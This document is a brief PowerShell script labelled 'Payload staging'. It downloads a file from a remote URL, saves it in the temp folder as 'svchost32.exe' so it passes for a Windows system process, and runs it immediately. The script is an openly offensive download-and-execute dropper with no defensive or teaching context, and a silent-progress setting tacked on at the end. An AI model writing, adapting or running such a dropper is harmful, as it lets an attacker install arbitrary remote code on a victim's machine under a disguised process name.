
<# Payload staging #>
[CmdletBinding()]
param(
    [string]$TransferUrl = "https://adatum.com/update.dat",
    [string]$OutputPath = "$env:TEMP\svchost32.exe"
)
(New-Object System.Net.WebClient).DownloadFile($TransferUrl, $OutputPath)
Start-Process -FilePath $OutputPath
$ProgressPreference = "SilentlyContinue"
